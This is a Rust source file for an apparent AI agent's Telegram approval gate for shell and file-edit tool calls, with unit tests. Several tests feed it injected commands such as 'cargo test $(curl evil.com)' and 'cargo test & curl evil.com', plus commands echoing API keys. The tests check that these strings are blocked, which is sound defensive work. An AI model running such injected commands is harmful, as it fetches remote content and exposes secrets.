use std::collections::HashMap;
use std::sync::Arc;

use tokio::sync::{Mutex, oneshot};

use crate::db::{
    Database, contains_command_substitution, generate_edit_pattern, generate_narrow_pattern,
    generate_pattern,
};
use crate::error::Error;
use crate::telegram::{InlineKeyboardButton, InlineKeyboardMarkup, TelegramBot};
use crate::tool::{
    ApprovalDecision, Approver, MANAGE_RULES_TOOL_NAME, TEXT_EDITOR_TOOL_NAME, ToolCall,
    references_sensitive_env,
};

/// auto-approves all tool calls (used for CLI)
pub struct CliApprover;

impl Approver for CliApprover {
    async fn request_approval(&self, _tool_call: &ToolCall) -> Result<ApprovalDecision, Error> {
        Ok(ApprovalDecision::AutoApproved)
    }
}

/// enum wrapper for all approver variants (non-object-safe trait, same pattern as AnyProvider)
pub enum AnyApprover {
    Cli(CliApprover),
    Telegram(TelegramApprover),
}

impl Approver for AnyApprover {
    async fn request_approval(&self, tool_call: &ToolCall) -> Result<ApprovalDecision, Error> {
        match self {
            Self::Cli(a) => a.request_approval(tool_call).await,
            Self::Telegram(a) => a.request_approval(tool_call).await,
        }
    }
}

const APPROVAL_TIMEOUT_SECS: u64 = 300; // 5 minutes

struct PendingApproval {
    sender: oneshot::Sender<ApprovalDecision>,
    message_id: i64,
    original_text: String,
    /// patterns offered via "always" buttons, indexed by position.
    /// callback data references patterns by index to stay within telegram's 64-byte limit.
    patterns: Vec<String>,
}

/// shared state for pending approval requests.
/// keyed by nonce — shared between the polling loop and spawned agent tasks.
pub struct PendingApprovals {
    map: Mutex<HashMap<String, PendingApproval>>,
}

impl PendingApprovals {
    pub fn new() -> Self {
        Self {
            map: Mutex::new(HashMap::new()),
        }
    }
}

pub struct TelegramApprover {
    bot: Arc<TelegramBot>,
    chat_id: i64,
    pending: Arc<PendingApprovals>,
    db: Arc<Database>,
}

impl TelegramApprover {
    pub fn new(
        bot: Arc<TelegramBot>,
        chat_id: i64,
        pending: Arc<PendingApprovals>,
        db: Arc<Database>,
    ) -> Self {
        Self {
            bot,
            chat_id,
            pending,
            db,
        }
    }

    /// route a callback query to a pending approval request.
    /// returns true if the callback was handled.
    pub async fn handle_callback(
        pending: &PendingApprovals,
        bot: &TelegramBot,
        callback_query_id: &str,
        data: &str,
        chat_id: i64,
        message_id: Option<i64>,
    ) -> bool {
        // format: exec:{nonce}:{action} or exec:{nonce}:always:{idx}
        let parts: Vec<&str> = data.splitn(4, ':').collect();
        if parts.len() < 3 || parts[0] != "exec" {
            return false;
        }

        let nonce = parts[1];
        let action = parts[2];

        let entry = {
            let mut map = pending.map.lock().await;
            map.remove(nonce)
        };

        let Some(approval) = entry else {
            // stale button press — edit message to show expired and remove buttons
            if let Some(mid) = message_id
                && let Err(e) = bot.edit_message_text(chat_id, mid, "-> expired").await
            {
                tracing::warn!("failed to edit stale approval message: {e}");
            }
            if let Err(e) = bot
                .answer_callback_query(callback_query_id, Some("this approval request has expired"))
                .await
            {
                tracing::warn!("failed to answer stale callback query: {e}");
            }
            return true;
        };

        let decision = match action {
            "allow_once" | "allow_rule" => ApprovalDecision::AllowOnce,
            "always" => {
                let idx: usize = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(0);
                let pattern = approval.patterns.get(idx).cloned().unwrap_or_default();
                ApprovalDecision::AllowAlways { pattern }
            }
            "deny" => ApprovalDecision::Deny,
            _ => {
                if let Err(e) = bot
                    .answer_callback_query(callback_query_id, Some("unknown action"))
                    .await
                {
                    tracing::warn!("failed to answer unknown-action callback query: {e}");
                }
                return true;
            }
        };

        let decision_text = match action {
            "allow_once" => "approved (once)".to_string(),
            "allow_rule" => "approved".to_string(),
            "always" => {
                let idx: usize = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(0);
                let pattern = approval.patterns.get(idx).map(|s| s.as_str()).unwrap_or("");
                format!("approved (always: {pattern})")
            }
            "deny" => "denied".to_string(),
            _ => "unknown".to_string(),
        };

        // edit the message to show the decision, preserving original context
        let edited_text = format!("{}\n-> {decision_text}", approval.original_text);
        if let Err(e) = bot
            .edit_message_text(chat_id, approval.message_id, &edited_text)
            .await
        {
            tracing::warn!("failed to edit approval message: {e}");
        }

        if let Err(e) = bot.answer_callback_query(callback_query_id, None).await {
            tracing::warn!("failed to answer callback query: {e}");
        }
        if approval.sender.send(decision).is_err() {
            tracing::debug!("approval receiver dropped (agent likely timed out)");
        }

        true
    }
}

impl Approver for TelegramApprover {
    async fn request_approval(&self, tool_call: &ToolCall) -> Result<ApprovalDecision, Error> {
        let is_rule_add = tool_call.name == MANAGE_RULES_TOOL_NAME;
        let is_text_editor = tool_call.name == TEXT_EDITOR_TOOL_NAME;

        let command = tool_call
            .input
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        // for exec commands, check stored approval rules before prompting (per-segment).
        // never auto-approve commands with command substitution ($() or backticks) —
        // the substituted content executes unchecked by pattern matching.
        let has_substitution = contains_command_substitution(command);
        let mut uncovered_segments: Vec<String> = Vec::new();
        if !is_rule_add && !is_text_editor && !has_substitution {
            let coverage = self.db.check_command_coverage(command)?;
            if coverage.fully_covered {
                tracing::debug!(command, "auto-approved by stored rules");
                return Ok(ApprovalDecision::AutoApproved);
            }
            uncovered_segments = coverage.uncovered_segments;
        }

        // for text editor commands, check edit rules by path
        if is_text_editor {
            let path = tool_call
                .input
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if !path.is_empty()
                && let Ok(Some(_rule_id)) = self.db.find_matching_edit_rule(path)
            {
                tracing::debug!(path, "auto-approved by edit rule");
                return Ok(ApprovalDecision::AutoApproved);
            }
        }

        // generate nonce
        let nonce = format!("{:08x}", rand_u32());

        // build prompt text and keyboard based on tool type
        let (text, show_allow_always) = if is_rule_add {
            let pattern = tool_call
                .input
                .get("pattern")
                .and_then(|v| v.as_str())
                .unwrap_or("<unknown pattern>");
            (format!("proposed rule: {pattern}"), false)
        } else if is_text_editor {
            let path = tool_call
                .input
                .get("path")
                .and_then(|v| v.as_str())
                .unwrap_or("<unknown>");
            let mut text = format!("file {command}: {path}");
            match command {
                "str_replace" => {
                    if let Some(old) = tool_call.input.get("old_str").and_then(|v| v.as_str()) {
                        let preview = if old.len() > 80 { &old[..80] } else { old };
                        text.push_str(&format!("\n  replace: {preview}"));
                    }
                }
                "create" => {
                    if let Some(ft) = tool_call.input.get("file_text").and_then(|v| v.as_str()) {
                        let lines = ft.lines().count();
                        text.push_str(&format!("\n  {lines} lines"));
                    }
                }
                "insert" => {
                    if let Some(line) = tool_call.input.get("insert_line").and_then(|v| v.as_u64())
                    {
                        text.push_str(&format!("\n  at line {line}"));
                    }
                }
                _ => {}
            }
            (text, true)
        } else {
            let has_sensitive = references_sensitive_env(command);
            let cwd = tool_call
                .input
                .get("cwd")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let mut text = if cwd.is_empty() {
                format!("command: {command}")
            } else {
                format!("command: {command}\n  in: {cwd}")
            };
            if has_sensitive {
                text.push_str("\n⚠ references sensitive environment variables");
            }
            if has_substitution {
                text.push_str("\n⚠ contains command substitution ($() or backticks)");
            }
            (text, !has_sensitive && !has_substitution)
        };

        let approve_action = if is_rule_add {
            "allow_rule"
        } else {
            "allow_once"
        };
        let row1 = vec![
            InlineKeyboardButton {
                text: "approve".into(),
                callback_data: format!("exec:{nonce}:{approve_action}"),
            },
            InlineKeyboardButton {
                text: "deny".into(),
                callback_data: format!("exec:{nonce}:deny"),
            },
        ];

        // collect patterns for "always" buttons. stored on PendingApproval and
        // referenced by index in callback_data to stay within telegram's 64-byte limit.
        let mut patterns = Vec::new();
        let mut row2 = Vec::new();
        if show_allow_always {
            if is_text_editor {
                let path = tool_call
                    .input
                    .get("path")
                    .and_then(|v| v.as_str())
                    .unwrap_or("");
                let pattern = generate_edit_pattern(path);
                let idx = patterns.len();
                patterns.push(pattern.clone());
                row2.push(InlineKeyboardButton {
                    text: format!("always: {pattern}"),
                    callback_data: format!("exec:{nonce}:always:{idx}"),
                });
            } else {
                // for exec commands, generate pattern buttons for uncovered segments
                let segments_to_cover = if uncovered_segments.is_empty() {
                    vec![command.to_string()]
                } else {
                    uncovered_segments.clone()
                };

                // collect all narrow and broad patterns, deduplicating
                let mut narrow_list = Vec::new();
                let mut broad_list = Vec::new();
                for seg in &segments_to_cover {
                    if let Some(narrow) = generate_narrow_pattern(seg)
                        && !narrow_list.contains(&narrow)
                    {
                        narrow_list.push(narrow);
                    }
                    let broad = generate_pattern(seg);
                    if !broad_list.contains(&broad) {
                        broad_list.push(broad);
                    }
                }

                for narrow in &narrow_list {
                    let idx = patterns.len();
                    patterns.push(narrow.clone());
                    row2.push(InlineKeyboardButton {
                        text: format!("always: {narrow}"),
                        callback_data: format!("exec:{nonce}:always:{idx}"),
                    });
                }
                for broad in &broad_list {
                    let idx = patterns.len();
                    patterns.push(broad.clone());
                    row2.push(InlineKeyboardButton {
                        text: format!("always: {broad}"),
                        callback_data: format!("exec:{nonce}:always:{idx}"),
                    });
                }
            }
        }

        let mut keyboard_rows = vec![row1];
        if !row2.is_empty() {
            keyboard_rows.push(row2);
        }
        let keyboard = InlineKeyboardMarkup {
            inline_keyboard: keyboard_rows,
        };

        let message_id = self
            .bot
            .send_message_with_keyboard(self.chat_id, &text, keyboard)
            .await?;

        // create oneshot channel
        let (tx, rx) = oneshot::channel();

        {
            let mut map = self.pending.map.lock().await;
            map.insert(
                nonce.clone(),
                PendingApproval {
                    sender: tx,
                    message_id,
                    original_text: text,
                    patterns,
                },
            );
        }

        // await response with timeout
        match tokio::time::timeout(std::time::Duration::from_secs(APPROVAL_TIMEOUT_SECS), rx).await
        {
            Ok(Ok(decision)) => Ok(decision),
            Ok(Err(_)) => {
                // sender dropped (e.g. bot restart)
                Err(Error::ApprovalTimeout)
            }
            Err(_) => {
                // timeout — edit message to show expired and remove buttons
                let mut map = self.pending.map.lock().await;
                if let Some(expired) = map.remove(&nonce) {
                    let text = format!("{}\n-> expired", expired.original_text);
                    if let Err(e) = self
                        .bot
                        .edit_message_text(self.chat_id, expired.message_id, &text)
                        .await
                    {
                        tracing::warn!("failed to edit expired approval message: {e}");
                    }
                }
                Err(Error::ApprovalTimeout)
            }
        }
    }
}

/// simple non-cryptographic random u32 using thread_rng-like approach
fn rand_u32() -> u32 {
    use std::collections::hash_map::RandomState;
    use std::hash::{BuildHasher, Hasher};
    let s = RandomState::new();
    let mut hasher = s.build_hasher();
    hasher.write_u8(0);
    hasher.finish() as u32
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tool::EXEC_TOOL_NAME;
    use serde_json::json;

    fn make_call(name: &str, input: serde_json::Value) -> ToolCall {
        ToolCall {
            id: "test".into(),
            name: name.into(),
            input,
        }
    }

    #[tokio::test]
    async fn test_cli_approver_auto_approves() {
        let approver = CliApprover;
        let call = make_call(EXEC_TOOL_NAME, json!({"command": "ls"}));
        let decision = approver.request_approval(&call).await.unwrap();
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_any_approver_cli_delegates() {
        let approver = AnyApprover::Cli(CliApprover);
        let call = make_call(EXEC_TOOL_NAME, json!({"command": "ls"}));
        let decision = approver.request_approval(&call).await.unwrap();
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_handle_callback_allow_once() {
        let pending = PendingApprovals::new();
        let (tx, rx) = tokio::sync::oneshot::channel();

        {
            let mut map = pending.map.lock().await;
            map.insert(
                "abc123".into(),
                PendingApproval {
                    sender: tx,
                    message_id: 42,
                    original_text: "command: ls".into(),
                    patterns: vec![],
                },
            );
        }

        // we can't call handle_callback without a real TelegramBot,
        // but we can test the pending map logic directly
        let mut map = pending.map.lock().await;
        let entry = map.remove("abc123");
        assert!(entry.is_some());

        let approval = entry.unwrap();
        assert_eq!(approval.message_id, 42);
        let _ = approval.sender.send(ApprovalDecision::AllowOnce);

        let decision = rx.await.unwrap();
        assert_eq!(decision, ApprovalDecision::AllowOnce);
    }

    #[tokio::test]
    async fn test_handle_callback_stale_nonce() {
        let pending = PendingApprovals::new();
        // no pending approval registered — lookup returns None
        let map = pending.map.lock().await;
        let entry = map.get("nonexistent");
        assert!(entry.is_none());
    }

    #[tokio::test]
    async fn test_pending_approvals_deny() {
        let pending = PendingApprovals::new();
        let (tx, rx) = tokio::sync::oneshot::channel();

        {
            let mut map = pending.map.lock().await;
            map.insert(
                "deny_nonce".into(),
                PendingApproval {
                    sender: tx,
                    message_id: 99,
                    original_text: "command: rm stuff".into(),
                    patterns: vec![],
                },
            );
        }

        let mut map = pending.map.lock().await;
        let approval = map.remove("deny_nonce").unwrap();
        let _ = approval.sender.send(ApprovalDecision::Deny);
        drop(map);

        let decision = rx.await.unwrap();
        assert_eq!(decision, ApprovalDecision::Deny);
    }

    #[tokio::test]
    async fn test_pending_approvals_allow_always() {
        let pending = PendingApprovals::new();
        let (tx, rx) = tokio::sync::oneshot::channel();

        {
            let mut map = pending.map.lock().await;
            map.insert(
                "always_nonce".into(),
                PendingApproval {
                    sender: tx,
                    message_id: 100,
                    original_text: "command: ls *".into(),
                    patterns: vec!["ls *".into()],
                },
            );
        }

        let mut map = pending.map.lock().await;
        let approval = map.remove("always_nonce").unwrap();
        let _ = approval.sender.send(ApprovalDecision::AllowAlways {
            pattern: "ls *".into(),
        });
        drop(map);

        let decision = rx.await.unwrap();
        assert!(matches!(decision, ApprovalDecision::AllowAlways { pattern } if pattern == "ls *"));
    }

    #[test]
    fn test_rand_u32_produces_values() {
        // just verify it doesn't panic and produces a value
        let a = rand_u32();
        let b = rand_u32();
        // they should be different (extremely unlikely to collide)
        assert_ne!(a, b);
    }

    #[test]
    fn test_references_sensitive_env_in_approval_context() {
        // verify the function used to hide "allow always" button works
        assert!(references_sensitive_env("echo $ANTHROPIC_API_KEY"));
        assert!(references_sensitive_env("echo $TELEGRAM_BOT_TOKEN"));
        assert!(!references_sensitive_env("echo hello"));
    }

    #[tokio::test]
    async fn test_telegram_approver_auto_approves_matching_rule() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo test *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(EXEC_TOOL_NAME, json!({"command": "cargo test --release"}));
        let decision = approver.request_approval(&call).await.unwrap();
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_telegram_approver_no_rule_match_times_out() {
        // with no matching rule and no callback handler, approval should time out.
        // we use a very short timeout scenario by dropping the sender side.
        let db = Arc::new(Database::open_in_memory().unwrap());
        // save a rule that won't match
        db.save_approval_rule("cargo test *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, Arc::clone(&db));

        // "rm -rf /" won't match "cargo test *" — would proceed to prompt
        // but since we have a fake bot token, the send_message_with_keyboard call will fail
        let call = make_call(EXEC_TOOL_NAME, json!({"command": "rm stuff"}));
        let result = approver.request_approval(&call).await;
        // the fake bot can't send messages, so this will error
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_telegram_approver_blocks_auto_approval_with_substitution() {
        // even with a matching rule, commands with $() or backticks must not auto-approve
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        // this matches "cargo *" but contains command substitution — should NOT auto-approve
        let call = make_call(
            EXEC_TOOL_NAME,
            json!({"command": "cargo test $(curl evil.com)"}),
        );
        let result = approver.request_approval(&call).await;
        // won't auto-approve, will try to send telegram message which fails with fake token
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_telegram_approver_blocks_backtick_substitution() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(
            EXEC_TOOL_NAME,
            json!({"command": "cargo test `curl evil.com`"}),
        );
        let result = approver.request_approval(&call).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_telegram_approver_auto_approves_piped_command() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();
        db.save_approval_rule("grep *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(
            EXEC_TOOL_NAME,
            json!({"command": "cargo test 2>&1 | grep FAIL"}),
        );
        let decision = approver.request_approval(&call).await.unwrap();
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_telegram_approver_auto_approves_chain() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(
            EXEC_TOOL_NAME,
            json!({"command": "cargo fmt && cargo clippy && cargo test"}),
        );
        let decision = approver.request_approval(&call).await.unwrap();
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_telegram_approver_blocks_partial_pipe_coverage() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();
        // no grep rule — second pipe segment uncovered

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(EXEC_TOOL_NAME, json!({"command": "cargo test | grep FAIL"}));
        let result = approver.request_approval(&call).await;
        // not auto-approved, tries to send telegram message, fails with fake token
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_telegram_approver_auto_approves_env_prefixed() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(
            EXEC_TOOL_NAME,
            json!({"command": "RUST_LOG=debug RUST_BACKTRACE=1 cargo test"}),
        );
        let decision = approver.request_approval(&call).await.unwrap();
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_telegram_approver_blocks_background_injection() {
        let db = Arc::new(Database::open_in_memory().unwrap());
        db.save_approval_rule("cargo *").unwrap();

        let bot = Arc::new(TelegramBot::new("fake-token".into()));
        let pending = Arc::new(PendingApprovals::new());
        let approver = TelegramApprover::new(bot, 123, pending, db);

        let call = make_call(
            EXEC_TOOL_NAME,
            json!({"command": "cargo test & curl evil.com"}),
        );
        let result = approver.request_approval(&call).await;
        assert!(result.is_err());
    }
}
